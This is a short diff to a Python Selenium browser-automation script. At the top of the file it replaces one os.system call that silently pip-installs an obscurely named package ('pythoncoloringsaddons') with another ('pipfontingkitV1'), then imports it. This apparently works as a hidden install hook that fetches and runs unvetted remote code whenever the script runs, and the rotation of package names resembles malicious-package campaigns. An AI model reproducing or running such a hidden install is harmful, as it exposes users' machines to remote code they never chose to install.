@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringsaddons")
-import pythoncoloringsaddons
+os.system("pip install pipfontingkitV1")
+import pipfontingkitV1
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
